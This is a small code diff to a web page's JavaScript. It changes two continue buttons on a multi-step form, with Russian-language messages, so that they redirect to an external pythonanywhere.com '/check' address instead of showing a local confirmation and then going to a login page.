@@ -166,39 +166,11 @@
             document.querySelector('.third-step').style.display = 'block';
         });
         document.getElementById('continueBtn_3').addEventListener('click', function() {
-            const thirdInput = document.getElementById('thirdInput').value;
-            
-            if (thirdInput.trim() === '') {
-                alert('Пожалуйста, введите текст в поле');
-                return;
-            }
-            document.querySelector('.form-container').style.display = 'none';
-            document.querySelector('.head2').style.display = 'none';
-            document.querySelector('.third-step').style.display = 'none';
-            document.querySelector('.confirmation').style.display = 'block';
-            setTimeout(() => {
-                document.querySelector('.confirmation').style.display = 'none'
-                document.querySelector('.okay').style.display = 'block';
-
-            }, 4000);
-            setTimeout(function() {
-            window.location.href = "index_auth.html";
-            }, 5000);
+            window.location.href = "https://syta.pythonanywhere.com/check"
 
         });
         document.getElementById('continueBtn_4').addEventListener('click', function() {
-
-            document.querySelector('.form-container').style.display = 'none';
-            document.querySelector('.head2').style.display = 'none';
-            document.querySelector('.third-step').style.display = 'none';
-            document.querySelector('.confirmation').style.display = 'block';
-            setTimeout(() => {
-                document.querySelector('.confirmation').style.display = 'none'
-                document.querySelector('.okay').style.display = 'block';
-            }, 4000);
-            setTimeout(function() {
-            window.location.href = "index_auth.html";
-            }, 5000);
+            window.location.href = "https://syta.pythonanywhere.com/check"
         });
 
 
